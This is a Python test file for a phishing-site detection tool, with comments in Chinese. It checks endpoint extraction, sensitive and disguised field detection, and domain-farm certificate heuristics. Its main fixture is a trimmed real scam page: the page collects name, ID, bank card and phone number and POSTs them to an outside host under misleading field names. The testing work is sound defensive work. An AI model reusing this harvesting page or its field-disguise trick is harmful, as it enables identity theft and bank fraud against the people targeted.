"""后端端点提取：谁在收数据。

这一层存在的理由是一次真实验证：

    np4w53 首页只有一句「2026 年度补贴已到账，点击申报」，HTML 里连 <form>
    都没有。点进去才看到收姓名/身份证/银行卡/手机号的表单，而提交地址写在
    JS 里 —— `https://d7k2m.cn/submit.php`，同样十个同模板站全部指向它。

没有这一层，系统只知道十个域名；有了这一层，知道的是一个团伙。
"""

from __future__ import annotations

from silver_sentinel.collectors.endpoints import _hint_kind, extract

# ---------------------------------------------------------------- 真实样本

# 结构取自 np4w53.cn 的 1.html（2026-11 在线版本，已精简）。
REAL_FORM_PAGE = """
<html><body>
<div class="form">
  <input type="text" id="username" placeholder="请输入与身份证一致的姓名">
  <input type="text" id="idcard" placeholder="请输入18位有效身份证号码" maxlength="18">
  <input type="text" id="bankcard" placeholder="请输入本人名下有效的借记卡号">
  <input type="text" id="phone" placeholder="请输入银行卡预留的11位手机号" maxlength="11">
  <button id="submit-btn">提交申请</button>
</div>
<script>
$('#submit-btn').click(function(){
  $.ajax({
    url:'https://d7k2m.cn/submit.php', type:'POST', dataType:'json',
    data:{id:p.get('id'), username:user.username, password:user.idcard,
          captcha_denglu:user.bankcard, captcha_sfshouji:user.phone}
  });
});
var m = new URLSearchParams(location.search).get('member');
if(m){ fetch('https://d7k2m.cn/add_visit.php?member='+encodeURIComponent(m)) }
</script>
</body></html>
"""


def test_real_form_page_yields_backend_endpoint():
    report = extract(REAL_FORM_PAGE, "https://np4w53.cn/1.html")

    urls = [e.url for e in report.endpoints]
    assert "https://d7k2m.cn/submit.php" in urls, "提交端点必须被抓到"

    submit = next(e for e in report.endpoints if e.url.endswith("/submit.php"))
    assert submit.same_site is False, "跨域才是「后端」"
    assert "身份证号" in submit.sensitive
    assert "银行卡号" in submit.sensitive


def test_sensitive_fields_survive_missing_form_tag():
    """散装 input（没有 <form> 包裹）也要能识别。

    实测 np4w53 的 1.html 就是这样：input 直接摆在 div 里，靠 jQuery 取值。
    只扫 <form> 内部会一条字段都拿不到——「在收身份证」这个最硬的证据就丢了。
    """
    report = extract(REAL_FORM_PAGE, "https://np4w53.cn/1.html")
    submit = next(e for e in report.endpoints if e.url.endswith("/submit.php"))
    kinds = {f.kind for f in submit.fields}
    assert {"姓名", "身份证号", "银行卡号", "手机号"} <= kinds


def test_third_party_noise_is_dropped():
    html = """
    <script src="https://cdn.jsdelivr.net/npm/jquery.min.js"></script>
    <script src="https://hm.baidu.com/hm.js?id=abc"></script>
    <img src="https://www.google-analytics.com/collect?v=1">
    <script>fetch('https://analytics.umeng.com/api/post')</script>
    """
    report = extract(html, "https://example.cn/")
    assert all("baidu" not in e.url for e in report.endpoints)
    assert all("jsdelivr" not in e.url for e in report.endpoints)
    assert all("umeng" not in e.url for e in report.endpoints)


def test_same_site_endpoint_kept_but_flagged():
    html = """<form action="/post.php" method="post">
      <input name="idcard" placeholder="身份证号码">
    </form>"""
    report = extract(html, "https://evil.cn/")
    assert len(report.endpoints) == 1
    assert report.endpoints[0].same_site is True
    assert report.endpoints[0].url == "https://evil.cn/post.php"


def test_normal_form_is_not_flagged_sensitive():
    """正常登录页：字段名与提示语一致，不该被当成伪装。"""
    html = """<form action="/login.php" method="post">
      <input name="username" placeholder="用户名">
      <input name="password" type="password" placeholder="密码">
    </form>"""
    report = extract(html, "https://shop.cn/")
    ep = report.endpoints[0]
    assert ep.sensitive == ["密码"]
    assert ep.disguised == []


# ---------------------------------------------------------------- 字段语义

def test_hint_parsing_prefers_rightmost_core_word():
    """「银行卡预留的11位手机号」是手机号，不是卡号。"""
    assert _hint_kind("请输入银行卡预留的11位手机号") == "手机号"
    assert _hint_kind("请输入本人名下有效的借记卡号") == "银行卡号"
    assert _hint_kind("请输入18位有效身份证号码") == "身份证号"


def test_disguised_field_detected():
    """`password` 字段收身份证——对着扫描器写的。"""
    html = """<form action="/submit.php" method="post">
      <input name="password" placeholder="请输入身份证号码">
    </form>"""
    report = extract(html, "https://evil.cn/")
    ep = report.endpoints[0]
    assert ep.disguised == ["password"]
    assert ep.fields[0].kind == "身份证号"


def test_field_without_hint_is_not_disguised():
    """只有字段名、没有提示语时无法判定伪装，不要瞎猜。"""
    html = """<form action="/x.php"><input name="idcard"></form>"""
    report = extract(html, "https://evil.cn/")
    assert report.endpoints[0].disguised == []


def test_empty_html_is_safe():
    report = extract("", "https://x.cn/")
    assert report.endpoints == []
    assert report.backend_hosts == []


def test_javascript_url_is_ignored():
    html = """<a href="javascript:void(0)">点我</a>
    <script>location.href='javascript:;'</script>"""
    report = extract(html, "https://x.cn/")
    assert all("javascript" not in e.url for e in report.endpoints)


def test_third_party_cross_domain_page_goes_to_backend_hosts():
    """跨域的普通页面（不是脚本端点）进 backend_hosts，不当提交端点。"""
    html = """<script>location.href='https://pay.example.net/checkout?id=1'</script>"""
    report = extract(html, "https://evil.cn/")
    assert "pay.example.net" in report.backend_hosts


# ---------------------------------------------------------------- 分级

def test_backend_asset_never_falls_into_cold(fresh_db):
    """提交端点的页面往往是一片空白（只接受 POST）。

    拿正文判它，等于用「没有内容」证明「没有问题」。它必须留在候选池——
    d7k2m.cn 首页只有 917 字节，但它是十个前端站的总收单口。
    """
    from silver_sentinel import triage
    from silver_sentinel.models import Asset

    a = Asset(
        kind="domain",
        value="d7k2m.cn",
        normalized="d7k2m.cn",
        tier="candidate",
        score=0.0,
        verdict="insufficient",
        discovery_source="backend",
        meta={"role": "backend", "serves": ["np4w53.cn"]},
    )
    d = triage.decide(a)
    assert d.tier == "candidate"
    assert "提交端点" in d.reasons[0]


# ---------------------------------------------------------------- 证书批次（v1.13）

def test_bulk_cert_detection_uses_ratio_not_presence():
    """一张证书挂 90 个随机串域名 = 站群；挂 50 个业务域名 = 正常站。

    实测 np4w53.cn 的 LiteSSL 证书 SAN 有 91 个名字，全是 `oi6o45.cn`
    `uw2v71.cn` 这种；baidu.com 的 SAN 也有 50 个，但都是
    `click.hm.baidu.com` `baifubao.com`。判据必须是比例。
    """
    from silver_sentinel.discover.morph import is_bulk_batch

    batch = [
        "oi6o45.cn", "uw2v71.cn", "tx7y28.cn", "np4w53.cn", "bv1m97.cn",
        "jk5k39.cn", "gh2h86.cn", "sd9f15.cn", "ak6d72.cn", "mn3n48.cn",
    ]
    assert is_bulk_batch(batch) is True

    normal = [
        "baidu.com", "click.hm.baidu.com", "baifubao.com", "www.baidu.cn",
        "m.baidu.com", "tieba.baidu.com", "zhidao.baidu.com", "map.baidu.com",
        "image.baidu.com", "v.baidu.com",
    ]
    assert is_bulk_batch(normal) is False


def test_bulk_cert_requires_enough_domains():
    """两个域名谈不上「一批」——共享主机的证书天天这样。"""
    from silver_sentinel.discover.morph import is_bulk_batch

    assert is_bulk_batch(["a1b2c.cn", "d3e4f.cn"]) is False
